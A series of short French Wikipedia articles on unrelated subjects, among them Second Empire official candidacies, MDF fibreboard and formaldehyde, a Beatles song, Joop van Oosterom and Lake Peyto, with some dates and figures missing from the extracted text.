Les candidats officiels étaient, au , des candidats aux élections proposés et soutenus par le pouvoir politique en place. Il s'agissait de faire en sorte que les futurs élus se comportent comme des soutiens du régime en place.
Histoire.
Du Directoire à 1851.
La pratique pour le gouvernement de recommander aux électeurs des candidats remonte au Directoire et à la Restauration, surtout après l'épisode de la chambre introuvable, mais prend une importance particulière sous le second Empire.
Sous le Second Empire.
Leurs affiches électorales étaient reconnaissables à leur couleur blanche, couleur des documents officiels publiés par le gouvernement. Ils bénéficiaient de différents avantages — facilités administratives, facilités dans le déroulement de leur campagne électorale — et du soutien des préfets locaux.
Sous le Second Empire, ces candidatures officielles étaient gérées par le ministère de l'intérieur (dirigé par Charles de Morny puis par Victor de Persigny à partir de ). Les candidats officiels ont permis de renforcer les nouvelles institutions. L'élection du Corps législatif était davantage destinée à affirmer le soutien de l'opinion publique française au chef de l'État et à préserver l'union nationale autour de l'empereur Napoléon qu'à assurer l'élection d'une assemblée représentative du titulaire de la souveraineté nationale. Une candidature officielle était donc assimilée à un « contrat » entre l'Empire et un candidat, au terme duquel ce dernier s'engageait (Persigny).
La candidature officielle est abandonnée par le régime le 24 février 1870 à l'aube de l'Empire dit parlementaire, successeur de l'Empire autoritaire et de l'Empire libéral.
Dernières attestations.
La pratique de la candidature officielle est attestée en 1871 et au début de la Troisième République, même si elle n'a plus le caractère systématique qu'elle avait sous le Second Empire.

</doc>
<doc id="2845945" url="https://fr.wikipedia.org/wiki?curid=2845945" title="Le Miel de Donald">
Le Miel de Donald

Le Miel de Donald ("Honey Harvester") est un dessin animé de la série des Donald produit par Walt Disney pour RKO Radio Pictures sorti le .
Synopsis.
Une abeille, qui travaille dur pour récupérer le nectar des fleurs et le stocker dans le radiateur de l'épave d'une voiture afin d'en faire du miel, est remarqué par Donald qui décide de la suivre afin de s'en emparer...
Titre en différentes langues.
D'après IMDb :

</doc>
<doc id="2845955" url="https://fr.wikipedia.org/wiki?curid=2845955" title="Deansgrange">
Deansgrange

Deansgrange ("Gráinseach an Déin" en Irlandais) est une ville de banlieue au sud de Dublin, située à un carrefour entre Dún Laoghaire et Foxrock.
Géographie.
Le carrefour est bordé par le centre commercial desservant des lotissements environnants à faible densité. La route R827 passe à travers Deansgrange suivant un axe nord-est - sud-ouest, de Blackrock à Cabinteely. 
Au sud du carrefour se trouve "Clonkeen Road" menant à "Clonkeen College", tandis qu'au nord se trouve "Deansgrange Road" menant à "Deans Grange Cemetery". "Kill Lane" se prolonge à l'est (jusqu'au carrefour Baker's Corner et Kill of the Grange) et à l'ouest (jusqu'à Foxrock).
&lt;br&gt;
Cimetière.
Le cimetière de Deansgrange est, avec le Glasnevin et Mount Jerome, l'un des plus grands cimetières de Dublin. C'est la dernière demeure de nombreuses personnalités, parmi lesquelles Edith Best, Flann O'Brien, le comte John McCormack, Frank O'Connor, Robert Lloyd Praeger, Seán Lemass, Dermot Morgan, et le prix Nobel Ernest Walton.

</doc>
<doc id="2845958" url="https://fr.wikipedia.org/wiki?curid=2845958" title="Diccionario panhispánico de dudas">
Diccionario panhispánico de dudas

Le ("DPD)" est une œuvre élaborée par les membres des 23 académies de la langue espagnole dans le but de résoudre les doutes liés à l'usage de la langue espagnole dans toute la communauté hispanophone. De la même manière que le dictionnaire, la grammaire espagnole et l'orthographe publiés par la Real Academia Española, il a un caractère normatif. La première édition fut publiée en 2005.
L'initiative fut au départ une réponse aux questions annuelles, soit environ 300 quotidiennes, qui parvenaient aux différentes Académies de langue portant sur l'usage correct de l'idiome.
Il se compose :
Quelques spécialistes ont débattu à propos de différents aspects de l'œuvre, tant en ce qui concerne les solutions adoptées qu'au niveau de son caractère normatif (parce qu'il décrit bien souvent plusieurs variantes, sans proposer de règles ni de solutions) et de ses contradictions, internes ou bien avec d'autres ouvrages normatifs également publiés par la RAE, comme l'orthographe et le dictionnaire. On a également critiqué l'absence de sources citées alors qu'il en existe de nombreuses et que certaines ont été prises en compte dans sa rédaction.

</doc>
<doc id="2845963" url="https://fr.wikipedia.org/wiki?curid=2845963" title="Panneau de fibres à densité moyenne">
Panneau de fibres à densité moyenne

Un panneau de fibres à densité moyenne ou MDF (pour "medium-density fiberboard", l'appellation anglophone) est un panneau de fibres de bois à moyenne densité (avec des masses volumiques variables : pour le HDF, pour le MDF, pour le light MDF), par opposition aux panneaux de fibres de bois durs (type Isorel ou Unalit) dont la densité est élevée (de l'ordre de ). Également connu sous la dénomination de medium (nom commercial du produit utilisé par la société Isoroy), ce panneau issu d'un procédé industriel continu, est constitué de fibres de bois et d'un liant synthétique à base de résine urée-formol que l'on soumet à des contraintes de température et de pression. Du fait qu'il pourrait être cancérigène, il est de moins en moins utilisé dans la construction. 
Ce matériau industriel, inventé par hasard aux États-Unis en , présente de multiples avantages :
Le MDF est un panneau polyvalent, surtout retrouvé dans l'aménagement et la décoration intérieure. Il se substitue dans la plupart des cas au contreplaqué, plus onéreux. Le MDF ne convient pas en panneaux de contreventement du fait qu'il est sensible à l'eau contrairement à l'OSB.
Il peut être ignifugé (Euroclasse B), cintré, laqué ou mélaminé et dans une certaine mesure hydrofugé (exclusivement en ambiance intérieure présentant des risques d'exposition temporaire à l'humidité).
Procédé de fabrication.
Les panneaux de MDF sont élaborés à partir de bois feuillus ou résineux (écorcés afin de réduire le taux de silice), réduits en copeaux à l'aide d'une coupeuse-déchiqueteuse. Les particules de moins de et de plus de sont éliminées.
Après une opération de défibrage à chaud, le mélange collant, constitué de plusieurs composants dont un liant ou colle (urée formol ou mélamine formol) un catalyseur et éventuellement d’autres adjuvants, est projeté en fines gouttelettes sur l’ensemble fibre et vapeur.
À l'issue d'un séchage, la matière fibreuse est pressée en panneaux.
Le procédé d'élaboration du MDF comprend huit opérations :
C'est en 1966, aux États-Unis, à l'occasion d'un incident technique que fut obtenu le premier MDF. La production a débuté vers le milieu des années 1970.
Les producteurs de MDF en France sont Panneaux de Corrèze avec l'usine d'Ussel pour la marque Médium, Finsa avec l'usine de Morcenx et Unilin avec l'usine de Bazeilles.
En 2009, Isoroy a fermé le site de Saint-Dizier et arrêté sa dernière presse à étage. Le site a été repris en 2011 par la société allemande Homatherm.
Problèmes sanitaires.
Les MDF ou fibres de moyenne densité sont un matériau composite fabriqué à partir de fibres agglomérées et contenant du formaldéhyde, responsable de cancers chez l’homme. Il irrite également la peau, les yeux et les muqueuses. Une exposition même brève et à de faibles concentrations peut dans certains cas déclencher des crises d’asthme chez les personnes sensibles. Couper, percer et usiner du MDF expose à de grandes quantités de poussière. Par inhalation, elles peuvent causer des pathologies ORL comme l’asthme ou le cancer de l'ethmoïde. On a largement évoqué ces risques concernant les bricoleurs à qui l'on recommande de prendre des précautions d'usage, telles que porter un masque et ouvrir portes et fenêtres de l'espace de travail.
Une fois posé et peint ou verni, le MDF continue à produire du formaldéhyde. Une norme européenne vise à limiter cette émission dans les matériaux récents.
Kelly et al. (1999) ont évalué les émissions de formaldéhyde de plusieurs produits du bois dans une chambre sur une période de 24 heures. Les émissions des produits du bois enduits contenant de l'urée-formaldéhyde (p. ex. mélamine, stratifié) variaient de &lt; 2,7 à 55 μg/m²h, à l'exception d'un produit qui émettait 460 μg/m²h, alors que les émissions des produits du bois non enduits contenant du phénol-formaldéhyde variaient de 4,1 à 9,2 μg/m²h. Parmi les produits non enduits contenant de l'urée-formaldéhyde, les émissions des produits de contreplaqué variaient de 8,6 à 103 μg/m²h, celles des panneaux d'aggloméré de 104 à μg/m²h et celles des produits de MDF de 210 à 364 μg/m²h.
Changements en Amérique du Nord depuis 2009.
En réponse aux préoccupations de santé concernant le formaldéhyde, le California Air Resources Board (CARB) a commencé en 2009 à durcir les normes pour les émissions de formaldéhyde provenant des MDF. La règle du CARB est devenu le standard de facto pour l'Amérique du Nord compte tenu du réseau de la chaîne d'approvisionnement en place à travers le continent. En effet il serait très peu pratique et plus coûteux pour les producteurs de composer avec plus d'une norme en Amérique du Nord.
Le CARB régule les émissions de formaldéhyde provenant des panneaux en bois composite vendus et utilisés à l'intérieur dans l'État de Californie. Les applications incluent les meubles, armoires de cuisine, revêtements de sol et plus encore.
Les panneaux en bois composite comprennent le contreplaqué de feuillus (CF), les panneaux de particules (PB) et les panneaux de particules à densité moyenne (MDF)
La règle du CARB est mise en œuvre en deux phases :

</doc>
<doc id="2845964" url="https://fr.wikipedia.org/wiki?curid=2845964" title="Bfr">
Bfr



</doc>
<doc id="2845966" url="https://fr.wikipedia.org/wiki?curid=2845966" title="Portail (web)">
Portail (web)



</doc>
<doc id="2845967" url="https://fr.wikipedia.org/wiki?curid=2845967" title="Joop van Oosterom">
Joop van Oosterom

Joop van Oosterom, né le à Hilversum et mort le à Monaco, est un milliardaire néerlandais, mécène et amateur du jeu d'échecs. Il est l'organisateur du tournoi annuel Amber de Monaco où les meilleurs joueurs d'échecs du monde se rencontrent en parties à l'aveugle et en parties rapides.
Biographie.
En 1955, il remporte le championnat junior des Pays-Bas. En 1966, il fonde, avec un autre ancien employé d'IBM l"'Automation Center Volmac" (racheté en 1992 par Capgemini), le premier éditeur de logiciels néerlandais. En 1988, la société est cotée en bourse et les fondateurs revendent leurs parts à prix d'or. La fortune personnelle d'Oosterom est estimée par le magazine néerlandais "Quote 500" à plus d'un milliard d'euros.
Van Oosterom fut un très fort joueur d'échecs par correspondance, détenteur du titre de grand maître d'échecs par correspondance et remportant le titre national en 1981, avant de souffrir d'un grave accident vasculaire cérébral il y a quelques années. Il a néanmoins remporté le championnat du monde d'échecs par correspondance en 2003-2005, un titre controversé, certains commentateurs notant qu'il avait pour secrétaire particulier l'ancien prodige néerlandais Jeroen Piket. En 2008, il remporte à nouveau le du monde par correspondance organisé par l'ICCF.

</doc>
<doc id="2845968" url="https://fr.wikipedia.org/wiki?curid=2845968" title="Diccionario Panhispánico de Dudas">
Diccionario Panhispánico de Dudas



</doc>
<doc id="2845969" url="https://fr.wikipedia.org/wiki?curid=2845969" title="Diccionario panhispánico de Dudas">
Diccionario panhispánico de Dudas



</doc>
<doc id="2845970" url="https://fr.wikipedia.org/wiki?curid=2845970" title="Prostaglandine E1">
Prostaglandine E1

La prostaglandine E1 (PGE1) est un acide gras eicosanoïde faisant partie de la famille des prostaglandines. Les recherches menées par les sciences pharmaceutiques sur les effets vasodilateteurs de cette molécule ont abouti à la mise au point d'un médicament (commercialisé sous le nom générique Alprostadil) approuvé pour le traitement de l'impuissance sexuelle chez l'homme.
Applications médicales.
Autres utilisations.
On utilise également l'aprostadil pour maintenir la persistance du canal artériel chez le fœtus. C'est utile surtout quand ce canal menace de se fermer prématurément.
Divers.
Elle fait partie de la liste des médicaments essentiels de l'Organisation mondiale de la santé (liste mise à jour en ).

</doc>
<doc id="2845973" url="https://fr.wikipedia.org/wiki?curid=2845973" title="Le Beau-père (film, 1987)">
Le Beau-père (film, 1987)

Le Beau-père (titre original : "") est un thriller américain réalisé par Joseph Ruben, sorti en 1987.
Synopsis.
Un homme tue toute sa famille et se prépare à en rejoindre une autre.
Sortie vidéo.
Le film sort en DVD/Blu-ray le édité par Elephant Films.

</doc>
<doc id="2845974" url="https://fr.wikipedia.org/wiki?curid=2845974" title="Rioutes">
Rioutes



</doc>
<doc id="2845976" url="https://fr.wikipedia.org/wiki?curid=2845976" title="Roman d'Eneas">
Roman d'Eneas



</doc>
<doc id="2845979" url="https://fr.wikipedia.org/wiki?curid=2845979" title="Brome flame retardant">
Brome flame retardant



</doc>
<doc id="2845980" url="https://fr.wikipedia.org/wiki?curid=2845980" title="Banque Molson">
Banque Molson

La banque Molson (en anglais : "The Molson Bank," parfois appelée "Molsons Bank") était une banque canadienne du Québec fondée à Montréal par les frères William et John Molson, fils du magnat de l'industrie de la bière John Molson.
Le premier président fut William Molson, qui en fut l'âme dirigeante pendant près de 20 ans.
Cette banque a été constituée en 1850 sous la loi du parlement de la Province du Canada appelée "Free Banking Act". En 1855, elle devient une banque à charte. Elle continuera ses opérations comme telle jusqu'en 1925, lorsqu'elle fusionnera avec la Banque de Montréal.
Édifice.
L'édifice de la Banque-Molson, de style Second Empire, situé au 278-288, rue Saint-Jacques, à Montréal, a été érigé entre 1864 et 1866. C'était le premier bâtiment à Montréal à être construit dans le style Second Empire, conçu par en collaboration avec son fils John James George Browne.

</doc>
<doc id="2845981" url="https://fr.wikipedia.org/wiki?curid=2845981" title="The Stepfather">
The Stepfather

"" signifie "beau-père" (dans le sens de parâtre) en anglais. "The Stepfather" est le titre de 4 films :

</doc>
<doc id="2845984" url="https://fr.wikipedia.org/wiki?curid=2845984" title="Le Beau-père">
Le Beau-père



</doc>
<doc id="2845990" url="https://fr.wikipedia.org/wiki?curid=2845990" title="Île Booth">
Île Booth

L'île Booth (quelquefois aussi appelée île Wandel) est une île escarpée située au large de la côte occidentale de la péninsule Antarctique, dans le nord-est de l'archipel Wilhelm, dont c'est, avec l'île Hovgaard, une des deux plus grandes îles. En forme de Y, l'île Booth mesure de long et s'élève à .
Géographie.
Le point le plus haut de l'île, le pic Wandel s'élève à d'altitude et reste (en 2003) toujours invaincu malgré plusieurs tentatives d'alpinistes.
Histoire.
Découverte et nommée lors de l'expédition allemande menée par Eduard Dallmann en 1873-1874, probablement en l'honneur d'Oskar Booth ou de Stanley Booth, ou des deux, membres de la Société géographique de Hambourg. L'Advisory Committee on Antarctic Names a rejeté le nom d'"île Wandel", donné plus tard lors de l'Expédition Antarctique belge, 1897-1899, en faveur du nom original. L'étroit passage entre l'île et le continent Antarctique est le spectaculaire chenal Lemaire.
C'est dans une baie qui deviendra Port-Charcot au nord de l'île Booth qu'a lieu l'hivernage de la première expédition Charcot pendant l'hiver 1904.

</doc>
<doc id="2845991" url="https://fr.wikipedia.org/wiki?curid=2845991" title="Glasnevin Cemetery">
Glasnevin Cemetery



</doc>
<doc id="2845993" url="https://fr.wikipedia.org/wiki?curid=2845993" title="Retardants">
Retardants



</doc>
<doc id="2845994" url="https://fr.wikipedia.org/wiki?curid=2845994" title="Amérique ibérique">
Amérique ibérique



</doc>
<doc id="2845995" url="https://fr.wikipedia.org/wiki?curid=2845995" title="Alphonse Meunier">
Alphonse Meunier

Alphonse François Meunier (né à Lessines le et mort à Louvain le ) est un prêtre catholique, botaniste et microbiologiste belge, spécialiste du plancton.
Biographie.
Après des humanités au petit séminaire de Bonne-Espérance, Alphonse Meunier suit trois années de théologie au Grand séminaire de Tournai. L'abbé Meunier entreprend ensuite un doctorat en paléontologie animale à l’université de Louvain sous la direction de Jean-Baptiste Carnoy. Il devient alors successivement assistant, chargé de cours, professeur agrégé puis professeur à l’université de Louvain où il est titulaire des cours suivants : « éléments de minéralogie, géologie et agrologie », « botanique (morphologie) », « biologie générale », « botanique tropicale », « météorologie » et « pisciculture ». Il est aussi nommé chanoine honoraire à la cathédrale Notre-Dame de Tournai.
Œuvre scientifique.
Passionné d’histoire naturelle, l’abbé Meunier possède une vaste culture scientifique, mais la botanique reste toujours son domaine de prédilection. Ses premiers travaux scientifiques sont consacrés aux Bryozoaires ; il abandonne rapidement la paléontologie animale pour se tourner vers l'anatomie, la cytologie et la morphologie végétale, puis vers l’étude du plancton. Son œuvre scientifique majeure est l’analyse et la description des échantillons planctoniques récoltés par Louis Stappers lors de l’expédition arctique organisée en 1907 par le duc d’Orléans à bord de la "Belgica". Dessinateur, il illustre lui-même ses publications.

</doc>
<doc id="2845996" url="https://fr.wikipedia.org/wiki?curid=2845996" title="Caius Terentilius Harsa">
Caius Terentilius Harsa

Caius Terentilius Harsa ou Caius Terentillus Arsa est un homme politique de la République romaine. C'est en tant que tribun de la plèbe qu'il propose de faire voter la "lex Terentilia" en 462 av. J.-C.
Biographie.
Tribunat de la plèbe (462).
Alors que les consuls Lucius Lucretius Tricipitinus et Titus Veturius Geminus Cicurinus mènent les armées en campagne contre les Volsques et les Èques, Harsa en profite pour dénoncer l'arbitraire du pouvoir que confère le consulat, les consuls étant selon lui semblables à deux rois, bien que contrairement à Volero Publilius quelques années plus tôt, Harsa ne semble pas avoir été victime personnellement de cet arbitraire. Soutenu par tous ses collègues, il présente alors un projet de loi, la "rogatio Terentilia", pour mettre en place une commission de cinq personnes avec pour mission de définir les limites du pouvoir consulaire en mettant par écrit les droits des consuls, offrant ainsi l'opportunité aux plébéiens de se protéger des abus de pouvoir. Pour Tite-Live, l'entreprise a un objectif uniquement politique mais pour Denys d'Halicarnasse, Harsa cherche en fait à imposer une égalité devant la loi, c'est-à-dire que les patriciens et les plébéiens soient soumis à la même législation.
Les consuls étant absents de Rome, c'est le préfet de la Ville Quintus Fabius Vibulanus qui intervient pour empêcher que ce projet de "Lex Terentilia" soit adopté. Il réunit le Sénat et dénonce les actes du tribun. Il réussit à convaincre les autres représentants du peuple de différer le vote de cette loi jusqu'au retour des consuls qui sont rappelés sur-le-champ à Rome. Au retour des consuls, Harsa relance son projet de loi, dont le vote est une nouvelle fois différé après une lutte acharnée des patriciens, pour permettre à un des consuls victorieux d'entrer à Rome en triomphe et à l'autre en ovation.
Conséquences de la "rogatio Terentilia".
Malgré l'opposition des patriciens, la proposition de Harsa n'est pas rejetée, mais seulement repoussée. Le nom de Caius Terentilius Harsa disparaît des récits antiques, seul son projet, dont l'authenticité paraît indiscutable, continue d'être mentionné. Son principe est en effet repris chaque année entre 462 et 454 au travers de nouveaux projets de loi que proposent les tribuns. Finalement, après plus de dix années de luttes, les tribuns de la plèbe, réélus année après année, obtiennent un compromis : ils abandonnent leur projet de "Lex Terentilia" et une commission est créée .

</doc>
<doc id="2845998" url="https://fr.wikipedia.org/wiki?curid=2845998" title="Belfast International Airport">
Belfast International Airport



</doc>
<doc id="2846000" url="https://fr.wikipedia.org/wiki?curid=2846000" title="The Night Before">
The Night Before

&lt;dfn&gt;'&lt;/dfn&gt; est une chanson du groupe britannique The Beatles, composée par Paul McCartney, bien que créditée Lennon/McCartney. Il s'agit d'une chanson évoquant les regrets d'un amour perdu, thème également évoqué par McCartney dans une autre chanson de l'album, '. Chanson pop rock au tempo rapide, elle introduit un instrument jusque-là inhabituel dans les compositions du groupe, le piano électrique.
Elle est enregistrée le dans les studios EMI (Abbey Road) de Londres et paraît le sur l'album "". Elle apparaît également dans le film du même nom et a fait l'objet de quelques reprises peu notoires.
Genèse.
' est composée, comme toutes les chansons du film ', alors que le scénario n'est pas encore terminé. Elle n'a donc aucun rapport, de près ou de loin, avec l'intrigue. La chanson est l'œuvre de Paul McCartney. Il s'agit d'une chanson sur un homme éconduit par sa compagne et qui exprime des regrets au souvenir de la nuit précédente. À la sortie de la chanson, John Lennon, souvent très critique, déclare que c'est du bon travail.
Sur le sens des paroles, le musicologue Allan Pollack fait le rapprochement entre cette chanson et une autre composition de McCartney à la même époque : '. Tandis que dans cette dernière, le chanteur est résigné et désespéré par ce qui lui arrive, ' conserve un espoir de réconciliation.
Enregistrement.
"" est enregistrée le en deux prises, dans l'après-midi. L'enregistrement est marqué par l'arrivée d'un nouvel instrument au nombre de ceux utilisés par les Beatles, un piano électrique derrière lequel s'installe John Lennon. Le chant principal de McCartney est par ailleurs doublé, comme c'est souvent le cas à cette période pour le groupe. Il est accompagné durant les couplets par Lennon et Harrison aux chœurs, qui répondent aux phrases de McCartney sur le bonheur passé avec sa compagne un nostalgique ().
Aux deux premiers couplets succèdent un pont (, ), puis deux nouveaux couplets auxquels succèdent un court solo de guitare et le retour au pont. Vient ensuite un dernier pont. La chanson est composée en ré majeur.
Le mixage mono est réalisé le lendemain par George Martin et Norman Smith. Le mixage stéréo se fait le en l'absence de George Martin.
Parution et reprises.
' est publiée au Royaume-Uni sur l'album ', en deuxième position de la face A, le . Aux États-Unis, elle paraît sur le même album, bien que celui-ci propose des chansons différentes. La chanson apparaît également dans le film du même nom, dans une scène durant laquelle les Beatles l'interprètent sur le terrain militaire de Salisbury Plain, encerclés par l'armée. La scène a été tournée trois semaines après l'enregistrement de la chanson.
Le , les Beatles l'enregistrent, dans les studios de la BBC, pour une diffusion le à l'émission "The Beatles (Invite You To Take A Ticket To Ride)". C'est une des rares chansons enregistrées à la BBC qui ne sera pas publiée sur disque par Apple Records.
La chanson a fait l'objet de quelques reprises assez peu notables : deux versions orchestrales ont été réalisées en 1965 dont une par George Martin. Le chanteur de jazz Herbie Mann l'a également reprise l'année suivante.
Publication en France.
La chanson arrive en France en sur la face B d'un 45 tours EP (« super 45 tours ») sous-titré "Chansons du film Help!" ; elle est accompagnée de "You're Going to Lose that Girl". Sur la face A figurent "Another Girl" et "I Need You".
Elle est publiée à nouveau en sur la face A d'un 45 tours EP ; elle est accompagnée de "Yesterday". Sur la face B figurent "Act Naturally " et "It's Only Love". La photo a été prise dans la plaine Salisbury lors tournage du film "Help!" pour la scène où le groupe, protégé par l'armée, mime la chanson "I Need You".

</doc>
<doc id="2846002" url="https://fr.wikipedia.org/wiki?curid=2846002" title="Jardin paradisiaque">
Jardin paradisiaque

Jardin paradisiaque (") est un dessin animé de la série des Donald produit par Walt Disney pour RKO Radio Pictures sorti le .
Synopsis.
Un vieux criquet, vivant à côté de Donald Duck, explique à un jeune pourquoi le jardin de Donald n'a rien d'un paradis...
Titre en différentes langues.
D'après IMDb :

</doc>
<doc id="2846004" url="https://fr.wikipedia.org/wiki?curid=2846004" title="Bfs">
Bfs



</doc>
<doc id="2846013" url="https://fr.wikipedia.org/wiki?curid=2846013" title="Breadth First Search">
Breadth First Search



</doc>
<doc id="2846017" url="https://fr.wikipedia.org/wiki?curid=2846017" title="Diccionario de uso del español">
Diccionario de uso del español

Le ("Dictionnaire d'usage de l'espagnol") est une œuvre créée par la lexicographe espagnole María Moliner à partir de 1962.
Il existe trois versions. La première n'est plus éditée et suit la structure originelle de l'auteur. La seconde est réorganisée et les définitions sont assez différentes, dans le but de « compléter et donner une forme définitive aux matériels existants ». Cette seconde version, éditée par Gredos, est source de conflits entre l'éditeur et les héritiers de l'écrivaine.

</doc>
<doc id="2846018" url="https://fr.wikipedia.org/wiki?curid=2846018" title="Ingmar Lazar">
Ingmar Lazar

Ingmar Lazar (Saint-Cloud, ) est un pianiste classique français.
Biographie.
Ingmar Lazar commence le piano à l'âge de cinq ans. Ses dons exceptionnels attirent rapidement l'attention et il se produit pour la première fois à la Salle Gaveau à l'âge de six ans.
Lauréat de nombreux concours internationaux, il remporte en 2013 le prix du piano de la Fondation Tabor au Verbier Festival (Suisse). Ingmar Lazar est artiste Steinway.
Ingmar Lazar a été invité à se produire à travers toute l'Europe, ainsi qu’aux États-Unis et en Asie dans des salles prestigieuses telles que la grande salle du Conservatoire Tchaïkovski et la Maison internationale de la musique à Moscou, l’Auditorium Charles-Bronfman de Tel-Aviv, le Concertgebouw d'Amsterdam, la Salle Cortot à Paris, La Seine musicale de Boulogne-Billancourt, l'Herkulessaal de Munich, la Fondation Internationale Mozarteum de Salzbourg, la Salle Verdi du Concervatoire de Milan, le Rudolfinum de Prague, l'Athénée roumain et la Philharmonie slovène de Ljubljana pour ne citer que quelques-unes, ainsi que dans de nombreux festivals (Festspiele Mecklenburg-Vorpommern, Festival des Semaines Européennes de Passau, Festival de La Roque-d'Anthéron, Festival international de Colmar, Festival Radio France Occitanie Montpellier, Festival Chopin à Paris, Festival « Les Piano Folies » du , Festival 1001 Notes en Limousin, Festival du Château de Lourmarin, Festival « Estate Regina » de Montecatini Terme, Festival de Musique de Sant Pere de Rodes, Festival International de Musique de Póvoa de Varzim, Gotthard Klassik-Festival Andermatt).
Il a joué sous la baguette de Julien Chauvin, Mykola Diadiura, Anna Duczmal-Mróz, Constantin Adrian Grigore, Mathieu Herzog, Jean-Jacques Kantorow, Nicolas Krauze, Vladimir Spivakov, Peter Vizard, et avec des orchestres tels que l'Orchestre National Philharmonique de Russie, l’orchestre de chambre « Les Virtuoses de Moscou », l'Orchestre Pasdeloup, l'Orchestre Lamoureux, le Concert de la Loge, l'Orchestre Symphonique Académique de la Philharmonie de Lviv, l’Orchestre Symphonique de Toruń, l’Orchestre de Chambre de la Radio Roumaine.
En tant que chambriste, il se produit avec des musiciens tels que Pierre Amoyal, Giuseppe Gibboni, Benjamin Herzl, Philippe Jaroussky, Danielle Laval, Jean-Claude Pennetier, François Salque, Christoph Seybold, Igor Tchetuev, ainsi qu’avec le Quatuor Hermès et le Vision String Quartet.
Sa discographie comporte un récital Schubert (Fantaisie « Wanderer » et Sonate D.959) paru chez Lyrinx en 2017, qui fut récompensé par « Le Choix de France Musique ». Un récital Beethoven (Bagatelles op. 33, sonates op. 81a « Les Adieux » et op. 111) enregistré en live au Théâtre National de Marseille « La Criée » fut publié en 2019 chez le même label. Son enregistrement consacré aux œuvres pour piano de César Franck paru chez Hänssler Classic en 2023 s’est vu récompensé par 5 de Diapason, ainsi que par 5 étoiles de Classica. Ingmar Lazar enregistra également plusieurs CDs pour le label Suoni e Colori comprenant des œuvres de Jean-Philippe Rameau, et en duo avec Alexandre Brussilovsky des œuvres de Jean Françaix, Mieczyslaw Weinberg et Efrem Podgaïts. En tant que défenseur de la musique contemporaine, il a également enregistré plusieurs œuvres de Pascal Arnault pour Triton/Hortus.
Ancien élève de Valéry Sigalevitch à Paris et d'Alexis Golovine à Genève, il a étudié à la Hochschule für Musik, Theater und Medien Hannover auprès de Vladimir Krainev, Zvi Meniker et Bernd Goetzke. Il poursuivit ses études à l’Académie internationale de Piano du Lac de Côme et au Conservatoire de la Suisse italienne (Lugano) dans le cadre de la fondation Theo Lieven, où il bénéficia des conseils de Dimitri Bachkirov, Malcolm Bilson, Fou Ts'ong et Stanislav Ioudénitch. Il se perfectionna auprès de Pavel Gililov à l’Universität Mozarteum de Salzbourg, ainsi qu'à la Scuola di Musica di Fiesole auprès d'Elisso Virsaladze. Boursier de l'Académie de Musique du Liechtenstein, il a également fait partie de la promotion Vivaldi de l'Académie Musicale Philippe Jaroussky.
Ingmar Lazar est depuis 2016 fondateur et directeur artistique du Festival du Bruit qui Pense, qui a lieu à Louveciennes dans les Yvelines. Il est nommé depuis 2024 président de l'Association des Amis du Château de Commarin en Côte d'Or, dont il assure la direction artistique de la saison culturelle qui s'y déroule.

</doc>
<doc id="2846019" url="https://fr.wikipedia.org/wiki?curid=2846019" title="Stade Mané Garrincha (Rio de Janeiro)">
Stade Mané Garrincha (Rio de Janeiro)

Le stade Mané Garrincha, anciennement appelé stade du Maréchal Hermes, est un stade brésilien, situé dans la zone nord de la ville de Rio de Janeiro.
Il fut construit en 1978, pour accueillir les matches du Botafogo de Futebol e Regatas, à l'emplacement d'un ancien terrain de football du Sport Club União, inauguré en 1922.
Histoire.
Le Botafogo y disputa ses matches après la perte de son siège et de son stade du Général Severiano. Le transfert intervint le jour anniversaire des 73 ans du Botafogo Football Club, le et il accueillit son premier match le , avec une victoire du Botafogo sur l'Associação Atlética Portuguesa, par 2 buts à 1.
Dans les années 1990, après avoir récupéré Général Severiano et obtenu la concession du stade Caio-Martins, l'équipe professionnelle cessa d'utiliser Maréchal Hermes, qui fut mis à disposition des équipes de jeunes du club.
À la fin de chaque année, la fameuse "peneira" y est organisée pour découvrir de nouveaux joueurs pour l'équipe. On y trouve deux terrains de football, aux normes officielles, ainsi qu'un hébergement utilisé par quelques joueurs.

</doc>
<doc id="2846020" url="https://fr.wikipedia.org/wiki?curid=2846020" title="EGAA">
EGAA



</doc>
<doc id="2846022" url="https://fr.wikipedia.org/wiki?curid=2846022" title="Stade de Marechal Hermes">
Stade de Marechal Hermes



</doc>
<doc id="2846023" url="https://fr.wikipedia.org/wiki?curid=2846023" title="Dictionnaire d'usage de l'espagnol">
Dictionnaire d'usage de l'espagnol



</doc>
<doc id="2846026" url="https://fr.wikipedia.org/wiki?curid=2846026" title="Beaufort County">
Beaufort County



</doc>
<doc id="2846028" url="https://fr.wikipedia.org/wiki?curid=2846028" title="Petr Fical">
Petr Fical

Petr Fical (né le à Jindřichův Hradec en Tchécoslovaquie) est un joueur professionnel de hockey sur glace Allemagne.
Biographie.
Carrière en club.
En 1995, il commence sa carrière avec les Straubing Tigers en 1. bundesliga. Il a joué pour le HC Karlovy Vary en Extraliga ainsi que pour l'Eisbären Regensburg, l'ESC Moskitos Essen, les Iserlohn Roosters. Depuis 2003 à 2010, il porte les couleurs des Nürnberg Ice Tigers.
Carrière en équipe nationale.
Il représente l'équipe d'Allemagne. Il a participé à plusieurs éditions des championnats du monde et aux Jeux olympiques d'hiver de 2006.

</doc>
<doc id="2846031" url="https://fr.wikipedia.org/wiki?curid=2846031" title="Lac Peyto">
Lac Peyto

Le lac Peyto ("Lake Peyto" en anglais) est un lac de l'Alberta, situé dans le parc national de Banff et les Rocheuses canadiennes, à environ 40 km au nord de la ville de Banff, facilement accessible par la promenade des Glaciers.
Étymologie.
Son nom rend hommage à Ebenezer William Peyto, un trappeur et guide de la région. "Wild Bill" de surnom, il était l'un des premiers gardiens du parc national de Banff.
Géographie.
Le lac s'est formé dans une vallée de la chaîne Waputik, entre les "Caldron Peak", "Peyto Peak" et Mont Jimmy Simpson, à une altitude de 1 880 mètres.
L'été, la fonte des glaciers et son corollaire, l'apport significatif de particules minérales en suspension, confèrent aux eaux du lac une lumineuse et fascinante couleur turquoise.
Le lac est alimenté par les eaux du "Peyto Creek", qui drainent le lac Caldron, et du glacier Peyto (une partie du champ de glace Wapta, avant de s'écouler dans la .
Le lac Peyto est l'un des lacs desservis par la promenade des Glaciers, dans les parcs nationaux Banff et Jasper, les autres lacs étant le lac Bow, le lac Louise, le lac Hector, le lac Mistaya, les lacs Waterfowl, le lac Chephren et le lac Sunwapta.
C'est depuis le "Bow Summit", le point le plus élevé de la promenade des glaciers, que la vue sur le lac est la plus belle.
Caractéristiques.
Le lac a une profondeur l'environ 90 mètres.Il est habituellement gelé et couvert de neige entre la mi-novembre et la mi-juin.
Pêche.
